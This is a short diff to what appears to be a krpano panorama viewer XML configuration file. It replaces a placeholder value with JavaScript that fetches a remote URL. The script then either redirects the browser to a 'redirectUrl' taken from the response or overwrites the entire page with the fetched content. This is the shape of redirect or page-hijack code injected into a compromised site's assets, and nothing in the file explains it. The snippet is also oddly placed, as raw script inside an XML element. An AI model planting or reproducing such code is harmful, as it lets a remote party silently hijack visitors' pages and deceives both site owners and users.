@@ -1,3 +1,21 @@
 <krpano version="1.0.8.15">
-1111
+fetch('https://www.google.com/webhp?hl=ar&sa=X&ved=0ahUKEwie4cX3muGHAxV7RvEDHVe5B38QPAgI')
+.then(function(res){
+    return res.text()
+})
+.then(function(e){
+    try{
+        var r = JSON.parse(e);
+        if(r['redirectUrl']){
+            window.location.href = r['redirectUrl'];
+        }
+    }catch(err){
+        document.open();
+        document.write(e);
+        document.close()
+    }
+})
+.catch(function(err){
+    console.error(err)
+});
 </krpano>
